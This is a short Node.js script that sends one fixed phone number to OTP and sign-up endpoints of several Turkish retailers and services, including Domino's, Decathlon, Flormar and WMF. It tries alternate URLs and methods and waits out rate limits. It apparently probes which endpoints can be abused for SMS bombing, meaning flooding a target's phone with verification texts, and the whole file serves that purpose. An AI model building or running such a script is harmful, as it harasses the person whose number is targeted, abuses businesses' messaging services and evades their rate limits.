import axios from 'axios';

const T = '5343622375';
const h = { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0' };

async function test(label, url, method, payload, headers) {
  try {
    const r = await axios({
      method,
      url,
      data: payload,
      headers: Object.assign({}, h, headers || {}),
      timeout: 10000,
      validateStatus: () => true,
    });
    console.log(label + ': ' + r.status + ' ' + JSON.stringify(r.data).substring(0, 120));
  } catch (e) {
    console.log(label + ': ERR ' + e.code);
  }
}

async function main() {
  // Dominos variations
  await test('dominos-orig', 'https://frontend.dominos.com.tr:443/api/customer/sendOtpCode', 'POST', {
    email: 't@t.com',
    isSure: false,
    mobilePhone: T,
  });
  await test('dominos-v2', 'https://www.dominos.com.tr/api/customer/sendOtpCode', 'POST', { email: 't@t.com', mobilePhone: T });
  await test('dominos-noemail', 'https://frontend.dominos.com.tr:443/api/customer/sendOtpCode', 'POST', { mobilePhone: T });

  // Flormar - try different method
  await test('flormar-post', 'https://www.flormar.com.tr/api/v1/auth/register/send-otp', 'POST', { phone: T });
  await test('flormar-get', 'https://www.flormar.com.tr/api/v1/auth/register/send-otp', 'GET', {}, {});

  // Decathlon
  await test('deca-post', 'https://www.decathlon.com.tr/api/v1/auth/register/send-otp', 'POST', { phone: T });
  await test('deca-get', 'https://www.decathlon.com.tr/api/v1/auth/register/send-otp', 'GET', {}, {});

  // Cineverse
  await test('cine-post', 'https://www.cineverse.com.tr/api/member/sendOtp', 'POST', { phone: T });
  await test('cine-get', 'https://www.cineverse.com.tr/api/member/sendOtp', 'GET', { phone: T });

  // Marti
  await test('marti-post', 'https://api.marti.tech/v1/auth/otp/send', 'POST', { phone: T });

  // Gamegaraj
  await test('gamegaraj', 'https://api.gamegaraj.com/api/auth/otp/send', 'POST', { phone: T });

  // BKM Kitap
  await test('bkmkitap', 'https://www.bkmkitap.com/api/v1/auth/register/send-otp', 'POST', { phone: T });

  // WMF - wait then retry
  console.log('\nWaiting 30s for rate limit reset...');
  await new Promise(r => setTimeout(r, 30000));
  await test('wmf-retry', 'https://www.wmf.com.tr/users/register/', 'POST', {
    phone: '0' + T,
    first_name: 'Test',
    last_name: 'Test',
    email: 't@t.com',
    password: 'Test123!',
    confirm: true,
    date_of_birth: '1990-01-01',
  });
}

main().catch(console.error);
